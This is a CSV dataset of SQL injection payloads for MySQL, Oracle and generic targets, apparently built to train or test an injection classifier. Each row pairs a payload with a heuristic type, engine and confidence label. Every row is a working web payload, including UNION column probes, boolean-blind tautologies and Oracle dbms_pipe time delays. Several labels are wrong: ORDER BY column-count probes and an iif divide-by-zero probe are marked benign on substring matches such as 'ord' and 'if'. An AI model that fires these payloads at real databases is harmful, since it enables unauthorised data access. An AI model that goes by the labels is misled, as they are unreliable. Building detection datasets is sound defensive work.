id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20215,"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""qqky"" like ""qqky",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20274,"1"" ) ) as duny where 3756 = 3756 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20230,-5500' ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
20236,"iif ( 4436 = 8910,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
20295,-4947' order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
20316,"-7088'|| ( select 'arol' from dual where 8891 = 8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
20398,"1%"" ) ) ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
20204,"-3420 where 9681 = 9681 or make_set ( 2438 = 1977,1977 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 59 chars.,2
20214,"1%"" union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 26 chars.,2
20219,"-5150 ) ) ) union all select 5660,5660,5660#",union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
20221,-9650' ) or 1390 = 3209,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
20222,-3582' ) or 6872 = 6872 and ( 'gyfj' = 'gyfj,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 44 chars.,2
20226,-4900' ) ) or 7208 = 3236,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
20234,"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
20241,-7034' ) ) ) union all select 4023#,union_based,generic,0.7,UNION-based payload detected. Payload length: 35 chars.,2
20246,"-4287%"" ) ) union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
20259,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
20260,"1%' union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
20267,"1' ) ) as cgey where 2130 = 2130 and make_set ( 7914 = 4032,4032 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 69 chars.,2
20268,"-7078'|| ( select 'lcza' where 5076 = 5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",union_based,generic,0.7,UNION-based payload detected. Payload length: 111 chars.,2
20270,"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
20279,"-6145'+ ( select nnjn where 1389 = 1389 union all select 1389,1389,1389--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
20281,"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",union_based,generic,0.7,UNION-based payload detected. Payload length: 74 chars.,2
20285,"-9615 ) as dntk where 4780 = 4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",union_based,generic,0.7,UNION-based payload detected. Payload length: 91 chars.,2
20290,"1' where 7688 = 7688 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 84 chars.,2
20291,"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
20298,"1%"" ) ) ) and 9198 = 9198--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
20303,"1' ) ) ) union all select null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
20305,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 72 chars.,2
20306,"-7714 where 9768 = 9768 union all select 9768,9768--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
20310,"-3433' ) where 8307 = 8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
20311,-3960' or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
20312,"-4427' ) ) union all select 6357,6357,6357,6357,6357#",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
20315,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20322,"1"" ) ) ) union all select null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
20326,"1"" where 4183 = 4183 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
20334,"-1823 where 6852 = 6852 union all select 6852,6852,6852,6852,6852,6852#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20335,-9708' where 8150 = 8150 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
20336,"-2639"" ) where 1494 = 1494 union all select 1494--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
20338,"-4825%' ) union all select 6804,6804,6804,6804,6804,6804,6804--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
20339,"1"" where 2221 = 2221 and 5318 = 8398--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
20341,-7742 ) as tgzq where 7842 = 7842 or 2062 = 1563,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
20348,-1730' or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
20350,1' ) where 5491 = 5491 and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
20352,-4058 ) union all select 9184--,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
20356,"1' ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 68 chars.,2
20361,1' in boolean mode ) and 5725 = 5552#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 37 chars.,2
20374,-9509' ) ) ) or 1091 = 5477 and ( ( ( 'gsmz' = 'gsmz,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 52 chars.,2
20377,1' ) as ubvf where 5923 = 5923 and 8490 = 4925--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
